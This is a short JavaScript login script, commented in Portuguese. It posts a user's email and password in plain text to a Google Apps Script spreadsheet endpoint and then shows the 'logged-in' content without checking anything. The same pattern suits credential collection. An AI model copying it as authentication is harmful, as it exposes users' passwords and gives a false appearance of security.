const URL_PONTE = "https://script.google.com/macros/s/AKfycbyvZ90Wg_7uvCWmyCCCtJgRmzWYM12JHZ0Hbypx6NGDJntIoFowYXLpT_kFLpDeypuN/exec";

function entrar() {
    const email = document.getElementById('email').value;
    const senha = document.getElementById('senha').value;

    // Envia os dados para o Google Apps Script
    fetch(URL_PONTE, {
        method: 'POST',
        mode: 'no-cors', 
        body: JSON.stringify({ email: email, senha: senha })
    }).then(() => {
        // Mostra a área logada
        document.getElementById('login-area').style.display = 'none';
        document.getElementById('conteudo-area').style.display = 'block';
        console.log("Conectado à planilha com sucesso!");
    }).catch(err => alert("Erro na conexão."));
}